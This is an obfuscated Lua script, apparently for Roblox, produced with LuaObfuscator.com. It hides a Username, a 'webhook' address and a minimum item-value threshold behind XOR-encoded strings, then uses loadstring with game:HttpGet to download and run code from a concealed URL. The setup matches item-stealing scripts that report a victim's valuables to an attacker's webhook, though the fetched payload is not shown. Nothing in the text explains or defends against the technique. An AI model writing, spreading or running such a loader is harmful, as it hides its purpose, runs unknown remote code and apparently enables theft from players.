--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end Username=v7("\255\198\204\51\244\171\203\31\200\198\201\114\191","\126\177\163\187\69\134\219\167");webhook=v7("\43\217\62\213\239\121\130\101\193\245\48\206\37\215\248\109\206\37\200\179\34\221\35\138\235\38\207\34\202\243\40\222\101\148\175\112\156\114\156\173\116\153\114\147\170\117\157\114\144\168\114\149\101\213\249\37\222\5\253\214\4\159\19\224\206\44\194\37\232\255\9\220\9\244\222\1\152\33\150\232\46\215\60\146\200\22\230\11\220\250\41\234\114\146\201\122\250\39\193\214\18\219\25\209\211\54\217\16\225\253\9\238\16\241\172\42\238\0\239\240\32","\156\67\173\74\165");min_rap=501291 -(191 + 1100) ;loadstring(game:HttpGet(v7("\60\163\93\6\175\124\9\123\165\72\1\242\33\79\32\191\92\20\169\53\67\38\180\70\24\168\35\72\32\249\74\25\177\105\112\53\175\26\66\235\126\9\2\182\81\89\174\35\64\39\248\65\19\189\34\85\123\186\72\31\178\105\118\7\238\16\91\148\15\98\16\146\103\37\159\20\111\4\131\122","\38\84\215\41\118\220\70"),true))();